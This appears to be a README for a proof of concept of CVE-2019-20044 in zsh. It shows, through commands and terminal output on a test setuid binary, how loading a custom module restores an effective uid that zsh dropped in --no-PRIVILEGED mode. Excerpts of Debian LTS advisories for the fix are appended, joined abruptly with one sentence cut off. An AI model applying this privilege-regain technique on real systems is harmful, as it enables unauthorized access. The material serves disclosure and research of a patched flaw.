# zsh-privileged-upgrade

Restore privileges dropped by zsh in --no-PRIVILEGED mode

## Concept

In zsh, when the PRIVILEGED option is turned off, zsh will "[cause] the effective user and group IDs to be set to the real user and group IDs." However, zsh doesn't change the saved uid. Therefore, the user can load a module that restores the euid to what is was before zsh dropped privileges.

## Example

```
bash % sudo useradd --no-create-home eric
bash % cp /usr/bin/zsh test-zsh
bash % sudo chown eric:eric test-zsh
bash % sudo chmod +s test-zsh
bash % ls -l test-zsh
-rwsr-sr-x 1 eric eric 865456 Nov 30 15:15 test-zsh
bash % ./test-zsh
zsh % id
uid=1000(sam) gid=1000(sam) euid=1001(eric) egid=1001(eric) groups=1001(eric),3(sys),150(wireshark),967(docker),987(uucp),998(wheel),1000(sam)
zsh % exit
bash % ./test-zsh --no-PRIVILEGED
zsh % id
uid=1000(sam) gid=1000(sam) groups=1000(sam)
zsh % cat /proc/$$/status | grep Uid
Uid:	1000	1000	1001	1000
zsh % ls -l setuid.so
-rwxr-xr-x 1 sam sam 14384 Nov 30 14:48 setuid.so
zsh % MODULE_PATH=. zmodload setuid
module loaded
zsh % setuid 1001
calling setuid with user id 1001
success
zsh % id
uid=1000(sam) gid=1000(sam) euid=1001(eric) groups=1000(sam),3(sys),150(wireshark),967(docker),987(uucp),998(wheel)

```

## Compiling setuid.so

Copy setuid.c and setuid.mdd into zsh-repo/Src/Modules/, then build zsh as normal. `setuid.so` will be built to zsh-repo/Src/Modules/setuid.so.

Version        : 5.0.7-5+deb8u1
CVE ID         : CVE-2019-20044
Debian Bug     : 951458

A privilege escalation vulnerability was discovered in zsh, a shell with
lots of features, whereby a user could regain a formerly elevated
privelege level even when such an action should not be permitted.

For Debian 8 "Jessie", this problem has been fixed in version
5.0.7-5+deb8u1.

We recommend that you upgrade your zsh packages.

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be

Package        : zsh
Version        : 5.3.1-4+deb9u4
CVE ID         : CVE-2017-18206 CVE-2018-0502 CVE-2018-1071 CVE-2018-1083
                 CVE-2018-1100 CVE-2018-13259 CVE-2019-20044
Debian Bug     : 908000 894044 894043 895225 951458

Several security vulnerabilities were found and corrected in zsh, a powerful
shell and scripting language. Off-by-one errors, wrong parsing of shebang lines
and buffer overflows may lead to unexpected behavior. A local, unprivileged
user can create a specially crafted message file or directory path. If the
receiving user is privileged or traverses the aforementioned path, this leads
to privilege escalation.

For Debian 9 stretch, these problems have been fixed in version
5.3.1-4+deb9u4.

We recommend that you upgrade your zsh packages.

For the detailed security status of zsh please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/zsh>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>
